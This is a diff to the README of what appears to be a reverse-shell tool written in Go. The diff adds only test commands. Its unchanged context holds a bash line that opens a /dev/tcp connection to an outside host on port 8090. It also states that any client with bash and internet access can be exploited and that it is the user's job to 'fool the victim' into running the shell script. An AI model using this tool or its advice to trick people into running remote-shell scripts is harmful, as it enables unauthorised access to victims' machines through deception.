@@ -25,3 +25,12 @@ A echo remote peer can be setup by `tee >& /dev/tcp/yanxurui.cc/8090 <&1`
 
 ## Client
 As long as the client has internet access and has bash installed, it can be exploited. It's your responsibility to fool the victim into running the shell script.
+
+
+## Development
+### Test
+```sh
+go test
+go test . -run Dis
+go test . -run TestRemoteDisconnected -v
+```
